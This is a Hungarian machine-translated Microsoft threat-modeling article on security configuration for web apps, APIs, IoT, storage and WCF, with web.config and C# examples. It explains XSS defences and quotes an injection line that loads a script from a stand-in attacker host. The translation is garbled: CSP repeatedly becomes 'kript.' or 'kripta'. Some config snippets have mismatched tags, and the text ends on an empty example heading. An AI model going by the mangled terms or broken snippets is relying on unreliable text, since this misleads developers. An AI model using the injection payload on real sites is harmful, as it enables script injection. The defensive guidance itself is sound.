---
title: A Microsoft Fenyegetésmodellező eszköz konfigurációkezelése
titleSuffix: Azure
description: a fenyegetésmodellezési eszközben elérhető fenyegetések enyhítése
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
ms.translationtype: MT
ms.contentlocale: hu-HU
ms.lasthandoff: 04/21/2020
ms.locfileid: "81687973"
---
# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés | Enyhítése 
| Termék/szolgáltatás | Cikk |
| --------------- | ------- |
| **Webalkalmazás** | <ul><li>[Tartalombiztonsági házirend (CSP) megvalósítása és inline javascript letiltása](#csp-js)</li><li>[Böngésző XSS-szűrőjének engedélyezése](#xss-filter)</li><li>[ASP.NET alkalmazásoknak le kell tiltaniuk a nyomkövetést és a hibakeresést a telepítés előtt](#trace-deploy)</li><li>[Hozzáférés külső gyártótól származó javascriptekhez csak megbízható forrásokból](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET oldalak tartalmazzák a felhasználói felület redressing vagy click-jacking védelmét](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható eredet engedélyezett, ha a CORS engedélyezve van ASP.NET webalkalmazásokban](#cors-aspnet)</li><li>[ValidateRequest attribútum engedélyezése ASP.NET oldalakon](#validate-aspnet)</li><li>[A JavaScript-tárak helyileg üzemeltetett legújabb verzióinak használata](#local-js)</li><li>[Automatikus MIME-szippantás letiltása](#mime-sniff)</li><li>[Szabványos kiszolgálófejlécek eltávolítása a Windows Azure webhelyein az ujjlenyomat-vétel elkerülése érdekében](#standard-finger)</li></ul> |
| **Adatbázis** | <ul><li>[Windows tűzfal konfigurálása az adatbázis-motor eléréséhez](#firewall-db)</li></ul> |
| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható eredetek engedélyezettek, ha a CORS engedélyezve van ASP.NET webes API-n](#cors-api)</li><li>[A webes API konfigurációs fájljainak bizalmas adatokat tartalmazó szakaszainak titkosítása](#config-sensitive)</li></ul> |
| **IoT-eszköz** | <ul><li>[Annak ellenőrzése, hogy az összes rendszergazdai felület erős hitelesítő adatokkal van-e biztosítva](#admin-strong)</li><li>[Annak biztosítása, hogy ismeretlen kód ne legyen végrehajtva az eszközökön](#unknown-exe)</li><li>[Az Operációs rendszer és az IoT-eszköz további partícióinak titkosítása bittárolóval](#partition-iot)</li><li>[Annak ellenőrzése, hogy csak a minimális szolgáltatások/funkciók legyenek engedélyezve az eszközökön](#min-enable)</li></ul> |
| **IoT field átjáró** | <ul><li>[Az IoT Field Gateway operációs rendszerének és további partícióinak titkosítása bittárolóval](#field-bit-locker)</li><li>[Annak ellenőrzése, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosultak-e a telepítés során](#default-change)</li></ul> |
| **IoT felhőátjáró** | <ul><li>[Győződjön meg arról, hogy a Cloud Gateway olyan folyamatot valósít meg, amely naprakészen tartja a csatlakoztatott eszközök belső vezérlőprogramját](#cloud-firmware)</li></ul> |
| **Gép megbízhatósági határa** | <ul><li>[Annak ellenőrzése, hogy az eszközök végponti biztonsági vezérlői a szervezeti házirendeknek megfelelően vannak-e konfigurálva](#controls-policies)</li></ul> |
| **Azure-tárhely** | <ul><li>[Az Azure storage-hozzáférési kulcsok biztonságos kezelésének biztosítása](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható eredetek engedélyezettek, ha a CORS engedélyezve van az Azure storage-ban](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[A WCF szolgáltatásszabályozási szolgáltatásának engedélyezése](#throttling)</li><li>[WCF-Információ közzététele metaadatokon keresztül](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Tartalombiztonsági házirend (CSP) megvalósítása és inline javascript letiltása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Bevezetés a tartalombiztonsági házirendbe](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [a tartalombiztonsági házirend hivatkozása](https://content-security-policy.com/), [a biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), a [tartalombiztonsági házirend bemutatása](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), Használhatom a [kript.](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Lépéseket** | <p>A Tartalombiztonsági házirend (CSP) egy mélyreható biztonsági mechanizmus, egy W3C szabvány, amely lehetővé teszi a webalkalmazások tulajdonosai számára, hogy ellenőrizzék a webhelyükbe ágyazott tartalmat. A kriptagép http-válaszfejlécként kerül hozzáadásra a webkiszolgálón, és az ügyféloldali böngészők kényszerítik ki. Ez egy whitelist-alapú házirend - egy webhely deklarálhatja a megbízható tartományok készletét, amelyekből az aktív tartalom, például a JavaScript betölthető.</p><p>A kript.</p><ul><li>**XSS elleni védelem:** Ha egy oldal ki van téve az XSS-nek, a támadó kétféleképpen használhatja ki:<ul><li>Adja `<script>malicious code</script>`be az injekciót. Ez a biztonsági rés nem fog működni a kripta-k alapkorlátozása miatt</li><li>Adja `<script src="http://attacker.com/maliciousCode.js"/>`be az injekciót. Ez a biztonsági rés nem fog működni, mivel a támadó által ellenőrzött tartomány nem lesz a kriptport engedélyezési listáján.</li></ul></li><li>**Az adatok kiszűrése:** Ha egy weblapon lévő rosszindulatú tartalom megpróbál csatlakozni egy külső webhelyhez, és adatokat lopni, a kripta-felhasználó megszakítja a kapcsolatot. Ennek az az oka, hogy a céltartomány nem szerepel a kripta-szolgáltató engedélyezési listáján</li><li>**Védelem a click-jacking ellen:** a click-jacking egy támadási technika, amelynek segítségével az ellenség bekeretezhet egy valódi webhelyet, és kényszerítheti a felhasználókat, hogy kattintsanak a felhasználói felület elemeire. Jelenleg a kattintás-razás elleni védelem egy válaszfejléc - X-Frame-Options ) konfigurálásával érhető el. Nem minden böngésző tartja tiszteletben ezt a fejlécet, és megy előre CSP lesz a szokásos módja annak, hogy megvédje a click-jacking</li><li>**Valós idejű támadásjelentés:** Ha egy csp-kompatibilis webhelyet injektálási támadás ér, a böngészők automatikusan értesítést küldanek a webkiszolgálón konfigurált végpontról. Ily módon a kripta valós idejű figyelmeztető rendszerként szolgál.</li></ul> |

### <a name="example"></a>Példa
Példa házirend: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ez a házirend lehetővé teszi, hogy a parancsfájlok csak a webalkalmazás kiszolgálójáról és a Google Analytics-kiszolgálóról töltődjenek be. A más helyekről betöltött parancsfájlokat a rendszer elutasítja. Ha a kript.p engedélyezve van egy webhelyen, a következő funkciók automatikusan le vannak tiltva az XSS-támadások csökkentése érdekében. 

### <a name="example"></a>Példa
A szövegközi parancsfájlok végrehajtása nem történik meg. Az alábbiakban példákat mutatunk be a szövegközi parancsfájlokra 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Példa
A karakterláncok kiértékelése nem lesz kódként. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Böngésző XSS-szűrőjének engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [XSS védelmi szűrő](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Lépéseket** | <p>Az X-XSS-Protection válaszfejléc-konfiguráció szabályozza a böngésző helyek közötti parancsfájlszűrőjét. Ez a válaszfejléc a következő értékekkel rendelkezhet:</p><ul><li>`0:`Ez letiltja a szűrőt</li><li>`1: Filter enabled`Ha a rendszer több webhelyre ható parancsfájl-támadást észlel, a támadás leállításához a böngésző fertőtleníti az oldalt</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy fertőtlenítené az oldalt, amikor egy XSS-támadást észlel, a böngésző megakadályozza az oldal megjelenítését</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző fertőtleníti az oldalt, és jelenti a szabálysértést.</li></ul><p>Ez egy chromium függvény, amely a CSP-szabálysértési jelentéseket felhasználva adatokat küld egy Ön által választott URI-ba. Az utolsó 2 lehetőség biztonságos értéknek minősül.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET alkalmazásoknak le kell tiltaniuk a nyomkövetést és a hibakeresést a telepítés előtt

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [ASP.NET Hibakeresés áttekintése](https://msdn.microsoft.com/library/ms227556.aspx) [, ASP.NET követés áttekintése](https://msdn.microsoft.com/library/bb386420.aspx), [Útmutató: Nyomkövetés engedélyezése egy ASP.NET alkalmazásban,](https://msdn.microsoft.com/library/0x5wc973.aspx) [Útmutató: Hibakeresés engedélyezése ASP.NET alkalmazásokhoz](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Lépéseket** | Ha a nyomkövetés engedélyezve van a lapon, minden azt kérő böngésző beszerzi a belső kiszolgálóállapotára és munkafolyamatára vonatkozó adatokat tartalmazó nyomkövetési adatokat is. Ez az információ biztonsági szempontból érzékeny lehet. Ha a lap hibakeresésengedélyezése engedélyezve van, a kiszolgálón előforduló hibák teljes veremkövetési adatokat eredményeznek a böngészőszámára. Ezek az adatok biztonsági szempontból érzékeny információkat tárhatnak fel a kiszolgáló munkafolyamatával kapcsolatban. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Hozzáférés külső gyártótól származó javascriptekhez csak megbízható forrásokból

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | a harmadik féltől származó JavaScriptekre csak megbízható forrásból lehet hivatkozni. A referencia-végpontok mindig SSL-en legyenek. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Győződjön meg arról, hogy a hitelesített ASP.NET oldalak tartalmazzák a felhasználói felület redressing vagy click-jacking védelmét

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [OWASP click-jacking defense cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Küzdelem a click-jacking X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Lépéseket** | <p>a "felhasználói felület jogorvoslati támadásának" is nevezik, ha a támadó több átlátszó vagy átlátszatlan réteget használ, hogy rávegye a felhasználót, hogy egy gombra vagy hivatkozásra kattintson egy másik oldalon, amikor a legfelső szintű oldalra kívánt kattintani.</p><p>Ez a rétegezés úgy érhető el, hogy egy rosszindulatú oldalt készít egy iframe-szel, amely betölti az áldozat oldalát. Így a támadó "eltéríti" az oldalukra vonatkozó kattintásokat, és egy másik oldalra irányítja őket, valószínűleg egy másik alkalmazás, tartomány vagy mindkettő tulajdonában. A kattintás-átverési támadások elkerülése érdekében állítsa be a megfelelő X-Frame-Options HTTP válaszfejléceket, amelyek arra utasítják a böngészőt, hogy ne engedélyezze a más tartományokból származó keretezést</p>|

### <a name="example"></a>Példa
Az X-FRAME-OPTIONS fejléc az IIS web.config fájlon keresztül állítható be. Web.config kódrészlet olyan webhelyekhez, amelyeket soha nem szabad bekeretezni: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Példa
Web.config kód olyan webhelyekhez, amelyeket csak az azonos tartományban lévő lapok keretezhetnek: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Győződjön meg arról, hogy csak megbízható eredet engedélyezett, ha a CORS engedélyezve van ASP.NET webalkalmazásokban

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Webes űrlapok, MVC5 |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ezt a korlátozást azonos eredetű házirendnek nevezzük, és megakadályozza, hogy egy rosszindulatú webhely bizalmas adatokat olvasson le egy másik webhelyről. Előfordulhat azonban, hogy szükség lehet az API-k biztonságos felfedésére, hogy más helyek mely helyeket használhatja fel. A Cross Origin Resource Sharing (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló számára az azonos eredetű házirend lazítását. A CORS használatával a kiszolgáló kifejezetten engedélyezheti a kereszteredjelöléseket, míg másokat elutasít.</p><p>A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, mint például a JSONP. A CORS engedélyezése lehetővé teszi, hogy néhány HTTP-válasz fejlécet (Access-Control-*) adjon hozzá a webalkalmazáshoz, és ezt többféleképpen is el végezheti.</p>|

### <a name="example"></a>Példa
Ha elérhető a web.config-hoz való hozzáférés, akkor a CORS a következő kóddal adható hozzá: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Példa
Ha a web.config fájlhoz való hozzáférés nem érhető el, akkor a CORS a következő CSharp-kód hozzáadásával konfigurálható: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Kérjük, vegye figyelembe, hogy fontos annak biztosítása, hogy az "Access-Control-Allow-Origin" attribútum ban szereplő eredetlista véges és megbízható eredethalmazra legyen állítva. Ha ezt nem megfelelően konfigurálja (pl. az érték '*' értékre állítása) lehetővé teszi, hogy a rosszindulatú webhelyek korlátozás nélkül aktiválják a webalkalmazás >, így az alkalmazás sebezhetővé válik a CSRF-támadásokkal szemben. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ValidateRequest attribútum engedélyezése ASP.NET oldalakon

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Webes űrlapok, MVC5 |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Kérelem érvényesítése – Parancsfájl-támadások megelőzése](https://www.asp.net/whitepapers/request-validation) |
| **Lépéseket** | <p>A kérelem ellenőrzése, amely az 1.1-es verzió óta ASP.NET szolgáltatás, megakadályozza, hogy a kiszolgáló elfogadja a nem kódolt HTML-kódot tartalmazó tartalmat. Ez a szolgáltatás segít megelőzni néhány parancsfájl-injektálási támadásokat, amelyek során az ügyfél parancsfájlkódvagy HTML tudatlanul elküldhető egy kiszolgálóra, tárolható, majd más felhasználók számára is megjelenik. Továbbra is javasoljuk, hogy érvényesítse az összes bemeneti adatot, és szükség esetén HTML-kódolást.</p><p>A kérelmek érvényesítése úgy történik, hogy az összes bemeneti adatot összehasonlítja a potenciálisan veszélyes értékek listájával. Ha egyezés történik, `HttpRequestValidationException`ASP.NET a . Alapértelmezés szerint a Kérésérvényesítés szolgáltatás engedélyezve van.</p>|

### <a name="example"></a>Példa
Ez a funkció azonban oldalszinten letiltható: 
```XML
<%@ Page validateRequest="false" %> 
```
vagy alkalmazási szinten 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Kérjük, vegye figyelembe, hogy a kérelem érvényesítése szolgáltatás nem támogatott, és nem része az MVC6-folyamatnak. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>A JavaScript-tárak helyileg üzemeltetett legújabb verzióinak használata

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | N/A  |
| **Lépéseket** | <p>A szabványos JavaScript-kódtárakat, például a JQueryt használó fejlesztőknek a közös JavaScript-kódtárak jóváhagyott verzióit kell használniuk, amelyek nem tartalmaznak ismert biztonsági hibákat. A tárak legújabb verzióját érdemes használni, mivel azok a régebbi verzióik ismert biztonsági réseihez szükséges biztonsági javításokat tartalmazzák.</p><p>Ha a legutóbbi kiadás kompatibilitási okok miatt nem használható, az alábbi minimális verziókat kell használni.</p><p>Elfogadható minimális változatok:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUi 1.10.0</li><li>JQuery érvényesítése 1,9</li><li>JQuery Mobil 1.0.1</li><li>JQuery ciklus 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax vezérlő eszközkészlet**<ul><li>Ajax vezérlő eszközkészlet 40412</li></ul></li><li>**ASP.NET webes űrlapok és az Ajax**<ul><li>ASP.NET Webes űrlapok és az Ajax 4</li><li>ASP.NET Ajax 3,5</li></ul></li><li>**ASP.NET, MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Soha ne töltsön be JavaScript-függvénytárat külső webhelyekről, például nyilvános CDN-ekről</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Automatikus MIME-szippantás letiltása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Referencia**              | [IE8 Biztonsági V. rész: Átfogó védelem,](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) [MIME típus](https://en.wikipedia.org/wiki/Mime_type) |
| **Lépéseket** | Az X-Content-Type-Options fejléc egy HTTP-fejléc, amely lehetővé teszi a fejlesztők számára, hogy megadják, hogy a tartalmukat ne lehessen mime-szippantottnak. Ez a fejléc a MIME-szimatoló támadások csökkentésére szolgál. Minden olyan lapon, amely a felhasználó által szabályozható tartalmat tartalmazhat, a HTTP Header X-Content-Type-Options:nosniff parancsot kell használnia. Ha az alkalmazás összes lapjához globálisan engedélyezni szeretné a szükséges fejlécet, az alábbi|

### <a name="example"></a>Példa
Adja hozzá a fejlécet a web.config fájlhoz, ha az alkalmazást az Internet Information Services (IIS) 7-től üzemelteti. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Példa
A fejléc hozzáadása a\_globális Alkalmazás BeginRequest alkalmazáson keresztül 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Példa
Egyéni HTTP-modul megvalósítása 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Példa
A szükséges fejlécet csak bizonyos oldalakhoz engedélyezheti, ha hozzáadja az egyes válaszokhoz: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Szabványos kiszolgálófejlécek eltávolítása a Windows Azure webhelyein az ujjlenyomat-vétel elkerülése érdekében

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | EnvironmentType - Azure |
| **Referencia**              | [Szabványos kiszolgálófejlécek eltávolítása Windows Azure-webhelyeken](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Lépéseket** | Az olyan fejlécek, mint a Server, az X-Powered-By, az X-AspNet-Version, információkat tárnak fel a kiszolgálóról és az alapul szolgáló technológiákról. Javasoljuk, hogy tiltsa le ezeket a fejléceket, ezáltal megakadályozva az alkalmazás ujjlenyomatvételét |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Windows tűzfal konfigurálása az adatbázis-motor eléréséhez

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Adatbázis | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | SQL Azure, OnPrem |
| **Attribútumok**              | N/A, SQL verzió - V12 |
| **Referencia**              | [Azure SQL-adatbázis-tűzfal konfigurálása](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Windows tűzfal konfigurálása az adatbázis-kezelő motorhoz való hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
| **Lépéseket** | A tűzfalrendszerek segítenek a számítógépes erőforrások illetéktelen elérésének megakadályozásában. Az SQL Server Database Engine egy példányának tűzfalon keresztüli eléréséhez konfigurálnia kell az SQL Server t futtató számítógép tűzfalát, hogy engedélyezze a hozzáférést |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható eredetek engedélyezettek, ha a CORS engedélyezve van ASP.NET webes API-n

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | MVC 5 |
| **Attribútumok**              | N/A  |
| **Referencia**              | [Több eredetű kérelmek engedélyezése ASP.NET Web API 2 alkalmazásban,](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [ASP.NET webes API - CORS-támogatás ASP.NET Web API 2 alkalmazásban](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Lépéseket** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ezt a korlátozást azonos eredetű házirendnek nevezzük, és megakadályozza, hogy egy rosszindulatú webhely bizalmas adatokat olvasson le egy másik webhelyről. Előfordulhat azonban, hogy szükség lehet az API-k biztonságos felfedésére, hogy más helyek mely helyeket használhatja fel. A Cross Origin Resource Sharing (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló számára az azonos eredetű házirend lazítását.</p><p>A CORS használatával a kiszolgáló kifejezetten engedélyezheti a kereszteredjelöléseket, míg másokat elutasít. A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, mint például a JSONP.</p>|

### <a name="example"></a>Példa
A App_Start/WebApiConfig.cs fájlban adja hozzá a következő kódot a WebApiConfig.Register metódushoz. 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Példa
Az EnableCors attribútum a vezérlő műveletmetódusaira a következőképpen alkalmazható: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Kérjük, vegye figyelembe, hogy fontos annak biztosítása, hogy az EnableCors attribútum ban szereplő eredetlista véges és megbízható eredetkészletre legyen állítva. Ha ezt nem megfelelően konfigurálja (pl. az érték '*' értékre állításával) lehetővé teszi, hogy a rosszindulatú webhelyek korlátozások nélkül aktiválják az API-ra irányuló, több eredetű kérelmeket, >ezáltal az API-t sebezhetővé teszi a CSRF-támadásokkal szemben. Az EnableCors vezérlő szinten is díszíthető. 

### <a name="example"></a>Példa
A CORS letiltásához egy adott metóduson egy osztályban, a DisableCors attribútum az alábbi módon használható: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazható technológiák** | MVC 6 |
| **Attribútumok**              | N/A  |
| **Referencia**              | [A kereszteredetű kérelmek (CORS) engedélyezése ASP.NET Core 1.0-ban](https://docs.asp.net/en/latest/security/cors.html) |
| **Lépéseket** | <p>A Core 1.0 ASP.NET a CORS engedélyezhető köztes szoftverrel vagy MVC használatával. Ha az MVC-t a CORS engedélyezéséhez használja, ugyanazokat a CORS-szolgáltatásokat használják, de a CORS köztes szoftver nem.</p>|

**1. megközelítés** Cors engedélyezése köztes szoftverrel: A CORS engedélyezése a teljes alkalmazás hoz hozzá a CORS middleware a kérelem folyamat a UseCors bővítmény módszer használatával. A corsPolicyBuilder osztály használatával a CORS köztes szoftver hozzáadásakor megadható a kereszteredetű házirend. Ezt kétféleképpen teheti meg:

### <a name="example"></a>Példa
Az első az, hogy hívja UseCors egy lambda. A lambda egy CorsPolicyBuilder objektumot vesz igénybe: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Példa
A második egy vagy több névvel ellátott CORS-házirend definiálása, majd a házirend kiválasztása név szerint futásidőben. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Megközelítés-2** Cors engedélyezése az MVC-ben: A fejlesztők az MVC segítségével műveletenként, vezérlőnként vagy globálisan alkalmazhatnak konkrét CORS-t az összes vezérlőre.

### <a name="example"></a>Példa
Műveletenként: CorS-házirend megadásához egy adott művelethez adja hozzá az [EnableCors] attribútumot a művelethez. Adja meg a házirend nevét. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Példa
Vezérlőnként: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Példa
Globálisan: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Kérjük, vegye figyelembe, hogy fontos annak biztosítása, hogy az EnableCors attribútum ban szereplő eredetlista véges és megbízható eredetkészletre legyen állítva. Ha ezt nem megfelelően konfigurálja (pl. az érték '*' értékre állításával) lehetővé teszi, hogy a rosszindulatú webhelyek korlátozások nélkül aktiválják az API-ra irányuló, több eredetű kérelmeket, >ezáltal az API-t sebezhetővé teszi a CSRF-támadásokkal szemben. 

### <a name="example"></a>Példa
